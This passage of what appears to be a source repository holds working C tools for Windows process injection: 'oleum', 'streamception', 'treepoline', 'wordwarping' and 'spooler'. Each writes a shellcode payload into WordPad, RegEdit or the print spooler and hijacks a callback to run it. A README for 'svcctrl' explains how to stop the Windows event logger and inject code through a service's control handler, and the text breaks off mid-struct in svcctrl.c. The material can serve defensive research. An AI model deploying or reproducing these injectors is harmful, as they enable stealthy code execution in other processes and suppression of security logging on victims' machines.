    WriteProcessMemory(hp, mem, &ds, sizeof(ULONG_PTR), &wr); 
    
    // 13. Select all in the edit control
    SendMessage(rew, EM_SETSEL, 0, -1);
    
    // 14. Trigger payload by invoking the GetClipboardData method
    PostMessage(rew, WM_COPY, 0, 0);
    
    // 15. Restore original value of IRichEditOle.lpVtbl
    WriteProcessMemory(hp, mem, &tbl, sizeof(ULONG_PTR), &wr);
    
    // 16. Free memory and close process handle
    VirtualFreeEx(hp, ptr,0,  MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    
    CloseHandle(hp);   
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;
    
    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: oleum <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    oleum(pic, len);
    return 0;
}

```

`richedit/streamception.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <richedit.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID streamception(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, rew;
    LPVOID        cs, ds;
    SIZE_T        rd, wr;
    EDITSTREAM    es;
    
    // 1. Get window handles
    wpw = FindWindow(L"WordPadClass", NULL);
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
    
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(rew, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    // 4. Allocate RW memory and copy the EDITSTREAM structure there.
    ds = VirtualAllocEx(hp, NULL, sizeof(EDITSTREAM),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
    es.dwCookie    = 0;
    es.dwError     = 0;
    es.pfnCallback = cs;
    
    WriteProcessMemory(hp, ds, &es, sizeof(EDITSTREAM), &wr);
    
    // 5. Trigger payload with EM_STREAMIN
    SendMessage(rew, EM_STREAMIN, SF_TEXT, (LPARAM)ds);

    // 6. Free memory and close process handle
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: streamception <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    streamception(pic, len);
    return 0;
}

```

`richedit/treepoline.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <psapi.h>
#include <richedit.h>
#include <commctrl.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

// requires elevated privileges
VOID treepoline(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, tlv;
    LPVOID        cs, ds, item;
    SIZE_T        rd, wr;
    TVSORTCB      tvs;
    
    // 1. get the treeview handle
    wpw = FindWindow(L"RegEdit_RegEdit", NULL);
    tlv = FindWindowEx(wpw, 0, L"SysTreeView32", 0);
    
    // 2. Obtain the process id and try to open process
    GetWindowThreadProcessId(tlv, &id);
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 3. Allocate RWX memory and copy the payload there.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
    
    // 4. Obtain the root item in tree list
    item = (LPVOID)SendMessage(tlv, TVM_GETNEXTITEM, TVGN_ROOT, 0);

    tvs.hParent     = item;
    tvs.lpfnCompare = cs;
    tvs.lParam      = 0;
    
    // 5. Allocate RW memory and copy the TVSORTCB structure
    ds = VirtualAllocEx(hp, NULL, sizeof(TVSORTCB),
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        
    WriteProcessMemory(hp, ds, &tvs, sizeof(TVSORTCB), &wr);
    
    // 6. Trigger payload
    SendMessage(tlv, TVM_SORTCHILDRENCB, 0, (LPARAM)ds);

    // 7. Free memory and close process handle
    VirtualFreeEx(hp, ds, 0,  MEM_RELEASE);
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: treepoline <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    treepoline(pic, len);
    return 0;
}

```

`richedit/wordwarping.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <richedit.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID wordwarping(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, rew;
    LPVOID        cs, wwf, ptr;
    SIZE_T        rd, wr;
    INPUT         ip;
    
    // 1. Get main window for wordpad.
    //    This will accepted simulated keyboard input.
    wpw = FindWindow(L"WordPadClass", NULL);
    
    // 2. Find the rich edit control for wordpad.
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
    
    // 3. Try get current address of Wordwrap function
    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, 0, 0);

    // 4. Obtain the process id for wordpad.
    GetWindowThreadProcessId(rew, &id);

    // 5. Try open the process.
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 6. Allocate RWX memory for the payload.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 7. Write the payload to memory
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    // 8. Update the callback procedure
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)cs);

    // 9. Simulate keyboard input to trigger payload
    ip.type           = INPUT_KEYBOARD;
    ip.ki.wVk         = 'A';
    ip.ki.wScan       = 0;
    ip.ki.dwFlags     = 0;
    ip.ki.time        = 0;
    ip.ki.dwExtraInfo = 0;
    
    SetForegroundWindow(wpw);
    SendInput(1, &ip, sizeof(ip));
    SendInput(1, &ip, sizeof(ip));
    
    // 10. Restore original Wordwrap function
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)wwf);
    
    // 12. Free memory and close process handle
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: wordwarping <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    wordwarping(pic, len);
    return 0;
}

```

`spooler/Makefile`:

```
spooler:
	cl /nologo /MD spooler.c
clean:
	del spooler.exe *.obj
```

`spooler/spooler.c`:

```c
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

SIZE_T payloadSize;    // size of shellcode
LPVOID payload;        // local pointer to shellcode

// try inject and run payload in remote process using callback object
BOOL inject(HANDLE hp, LPVOID ds, PTP_CALLBACK_OBJECT tco) {
    LPVOID             cs = NULL;
    BOOL               bStatus = FALSE;
    TP_CALLBACK_OBJECT cpy;
    TP_SIMPLE_CALLBACK tp;
    SIZE_T             wr;
    HANDLE             phPrinter = NULL;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(hp, NULL, payloadSize + sizeof(TP_SIMPLE_CALLBACK), 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
        // backup original callback object
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
        // copy original callback address and parameter
        tp.Function = cpy.Callback.Function;
        tp.Context  = cpy.Callback.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(hp, (LPBYTE)cs + payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context  = (LPBYTE)cs + payloadSize;
        // update callback object in remote process
        WriteProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        if(OpenPrinter(NULL, &phPrinter, NULL)) {
          ClosePrinter(phPrinter);
        }
        // read back the TCO
        ReadProcessMemory(hp, ds, &cpy, sizeof(cpy), &wr);
        // restore the original tco
        WriteProcessMemory(hp, ds, tco, sizeof(cpy), &wr);
        // if callback pointer is the original, we succeeded.
        bStatus = (cpy.Callback.Function == tco->Callback.Function);
        // release memory for payload
        VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
    }
    return bStatus;
}
        
// validates a callback object
BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // if it's a callback, these values shouldn't be empty  
    if(tco->CleanupGroupMember     == NULL ||
       tco->Pool                   == NULL ||
       tco->CallerAddress.Function == NULL ||
       tco->Callback.Function      == NULL) return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    if (!(mbi.Type & MEM_IMAGE)) return FALSE;
    
    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;

    // the caller address  should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);    
}

// try to locate valid callback objects in remote process
BOOL FindCallback(HANDLE hProcess, 
  LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE             addr = (LPBYTE)BaseAddress;
    SIZE_T             pos;
    BOOL               bRead, bFound=FALSE;
    SIZE_T             rd;
    TP_CALLBACK_OBJECT tco;
    WCHAR              filename[MAX_PATH];
    
    // scan memory for TCO
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(tco) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read TCO from writeable memory
      bRead = ReadProcessMemory(hProcess,
        &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_OBJECT)) continue;
      
      // is this a valid TCO?
      if(IsValidTCO(hProcess, &tco)) {
        // if this object resides in RPCRT4.dll, try use
        // it for process injection
        ZeroMemory(filename, ARRAYSIZE(filename));
        GetMappedFileName(hProcess, 
          (LPVOID)tco.Callback.Function, filename, MAX_PATH);

        if(StrStrI(filename, L"RPCRT4.dll") != NULL) {
          wprintf(L"Found TCO at %p for %s\n",  addr+pos, filename);
          // try run payload using this TCO
          // if successful, end scan
          bFound = inject(hProcess, addr+pos, &tco);
          if (bFound) break;
        }
      }
    }
    return bFound;
}

BOOL ScanProcess(DWORD pid) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject=FALSE;
    
    // try locate the callback environ used for ALPC in print spooler
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // if process opened
    if (hProcess != NULL) {
      // get memory info
      GetSystemInfo(&si);
      
      for (addr=0; addr < (LPBYTE)si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, but this will scan stack space too.
        // need to fix that..
        if ((mbi.State   == MEM_COMMIT)  &&
            (mbi.Type    == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE)) 
        {
          bInject=FindCallback(hProcess, mbi.BaseAddress, mbi.RegionSize);
          if(bInject) break;
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      CloseHandle(hProcess);
    }
    return bInject;
}

int main(void) {
    PWCHAR             *argv;
    int                argc;
    DWORD              pid;
    TP_CALLBACK_OBJECT tco;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc < 2) {
      wprintf(L"usage: spooler <payload>\n");
      return 0;
    }
    
    // try read pic
    payloadSize = readpic(argv[1], &payload);
    if(payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }
      
    // if not elevated, display warning
    if(!IsElevated()) {
      wprintf(L"[-] WARNING: This requires elevated privileges!\n");
    }
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
      wprintf(L"[-] Unable to enable debug privilege\n");
      return 0;
    }
    
    // get process id for spoolsv.exe service
    pid = name2pid(L"spoolsv.exe");
    if(pid==0)pid=_wtoi(argv[2]);
    
    if (pid == 0) {
      wprintf(L"unable to find pid for print spooler.\n");
      return 0;
    }
    
    wprintf(L"Scanning %i\n", pid);
    // locate viable callback object in spooler service
    wprintf(L"Spooler Injection : %s\n", 
      ScanProcess(pid) ? L"OK" : L"FAILED");
    return 0;
}


```

`svcctrl/Makefile`:

```
svcctrl:
	cl /nologo /MD svcctrl.c
clean:
	del svcctrl.exe *.obj
```

`svcctrl/README.md`:

```md

<h2>Fun with the Service Control Handler</h2>

<p>This tool was originally written for a CTF many years ago for the purpose of stopping the windows event logger. Since the event logger refused to accept SERVICE_CONTROL_STOP, the only option was to terminate the host process or at least the threads running the service.</p>

<h3>Internal Dispatch Entry</h3>

<p>Every Windows service has a "control handler" to receive control codes from the operating system. Depending on what the service is willing to accept, the more common control codes for a service are interrogate, start, stop, pause or resume. A pointer to the Control Handler is stored in a data structure on the heap that Microsoft refers to as an "Internal Dispatch Entry" (IDE).</p>

<p>The following structure is supported by versions of windows 7.</p>

<pre>
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    DWORD                   ServiceFlags;
    DWORD                   Tag;
    HANDLE                  MainThreadHandle;
    DWORD                   dwReserved;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
</pre>

<p>The following structure is supported by versions of windows 10.</p>

<pre>
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPWSTR                  ServiceName2;       // Windows 10
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    DWORD64                 ServiceFlags;        // 64-bit on windows 10
    DWORD64                 Tag;
    HANDLE                  MainThreadHandle;
    DWORD64                 dwReserved;
    DWORD64                 dwReserved2;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
</pre>

<p>To find valid entries consists of searching all writeable areas of memory for a process hosting a service.</p>

<h3>Stopping a service</h3>

<p>Once a valid service IDE has been found, we can stop the service by executing the ControlHandler code using a remote thread and passing SERVICE_CONTROL_STOP as the parameter. For more information, refer to the StopService() function.</p>

<h3>Process injection</h3>

<p>It's also possible to overwrite the ControlHandler value with a a pointer to other code and forcing the service to execute via the ControlService API and SERVICE_CONTROL_INTERROGATE code. This requires setting the ServiceFlags field to SERVICE_CONTROL_INTERROGATE. For more information, refer to the SvcCtrlInject() function.</p>

<h3>When things go wrong</h3>

<p>The service names in an IDE don't always correspond with the name in the service database. Take for example the following entry.</p>

<pre>
SERVICE_NAME: WpnUserService_2e777
DISPLAY_NAME: Windows Push Notifications User Service_2e777
        TYPE               : e0  USER_SHARE_PROCESS INSTANCE
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
</pre>

<p>This tool will find the host process for "WpnUserService_2e777" but will not find a valid IDE. An additional option is available (-l) to list all valid IDEs found in the host process. Using the same service again with -l</p>
  
<pre>
ServiceName         : 0000024667405FD0 (WpnUserService)
ServiceRealName     : 0000024667405FD0 (WpnUserService)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF9422D3C0
StatusHandle        : 00000246674155C0
ServiceFlags        : 0000000000000002
Tag                 : 00007FFF942381A0
MainThreadHandle    : 0000000000000111 (273)

ServiceName         : 0000024667406010 (UnistoreSvc)
ServiceRealName     : 0000024667406010 (UnistoreSvc)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF96FBF0D0
StatusHandle        : 00000246698FF100
ServiceFlags        : 0000000000000002
Tag                 : 00007FFF97008580
MainThreadHandle    : 000000000000010F (271)

ServiceName         : 0000024667406028 (PimIndexMaintenanceSvc)
ServiceRealName     : 0000024667406028 (PimIndexMaintenanceSvc)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF96E5DFD0
StatusHandle        : 0000024669C54440
ServiceFlags        : 0000000000000002
Tag                 : 00007FFF96E6AB00
MainThreadHandle    : 000000000000010D (269)

ServiceName         : 0000024667406056 (CDPUserSvc)
ServiceRealName     : 0000024667406056 (CDPUserSvc)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF9426FAD0
StatusHandle        : 0000024667415760
ServiceFlags        : 0000000000000002
Tag                 : 0000024667426060
MainThreadHandle    : 0000000000000108 (264)

ServiceName         : 000002466740606C (UserDataSvc)
ServiceRealName     : 000002466740606C (UserDataSvc)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF8501F4C0
StatusHandle        : 00000246698FF180
ServiceFlags        : 0000000000000002
Tag                 : 00007FFF85078500
MainThreadHandle    : 0000000000000110 (272)

ServiceName         : 0000024667406084 (OneSyncSvc)
ServiceRealName     : 0000024667406084 (OneSyncSvc)
ServiceStartRoutine : 00007FF790652F80
ControlHandler      : 00007FFF8498BE90
StatusHandle        : 0000024669841A40
ServiceFlags        : 0000000000000002
Tag                 : 00007FFF849AAFB0
MainThreadHandle    : 000000000000010C (268)
</pre>

<p>"WpnUserService" is the service name stored in the IDE, but the service database uses "WpnUserService_2e777". An additional option can be used to target a specific thread. Pass the decimal value of MainThreadHandle to the tool along with the database service name and it will locate the correct entry.</p>
  
  
  
  

```

`svcctrl/svcctrl.c`:

```c
/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#include "../ntlib/util.h"

typedef DWORD (WINAPI *RtlCreateUserThread_t)(
    IN HANDLE               ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN BOOL                 CreateSuspended,
    IN ULONG                StackZeroBits,
    IN OUT PULONG           StackReserved,
    IN OUT PULONG           StackCommit,
    IN LPVOID               StartAddress,
    IN LPVOID               StartParameter,
    OUT HANDLE              ThreadHandle,
    OUT LPVOID              ClientID);
    
#ifdef LEGACY
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    DWORD                   ServiceFlags;
    DWORD                   Tag;
    HANDLE                  MainThreadHandle;
    DWORD                   dwReserved;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
#else
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPWSTR                  ServiceName2;       // Windows 10
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
